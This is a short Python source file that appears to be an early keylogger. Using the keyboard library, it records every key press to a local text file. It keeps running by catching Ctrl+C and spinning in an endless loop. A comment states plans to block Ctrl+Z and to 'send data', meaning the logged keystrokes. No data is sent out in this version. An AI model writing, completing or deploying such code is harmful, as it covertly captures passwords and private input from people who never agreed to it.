import keyboard
#need to stop ctrl+z, and need to send data
# Define the log file
log_file = "key_log.txt"

# Function to write keystrokes to the log file
def log_keystroke(event):
    with open(log_file, "a") as f:
        f.write(event.name + "\n")

# Hook the keyboard to log all key events
keyboard.on_press(log_keystroke)

try:
    # Block the program and keep it running
    keyboard.wait()
except KeyboardInterrupt:
    print("KeyboardInterrupt caught. Continuing execution...")
    while True:
        pass  # Keep the program running indefinitely
